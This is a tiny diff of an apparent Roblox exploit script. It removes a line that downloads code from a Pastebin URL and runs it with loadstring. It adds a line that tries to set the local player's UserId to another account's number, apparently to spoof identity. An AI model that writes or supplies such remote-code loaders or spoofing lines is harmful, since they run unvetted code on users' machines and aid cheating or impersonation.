@@ -1,1 +1,2 @@
-loadstring(game:HttpGet('https://pastebin.com/raw/pDZ72MPw'))()
+-- execute in 40% of loading screen
+game.Players.LocalPlayer.UserId = 88542826
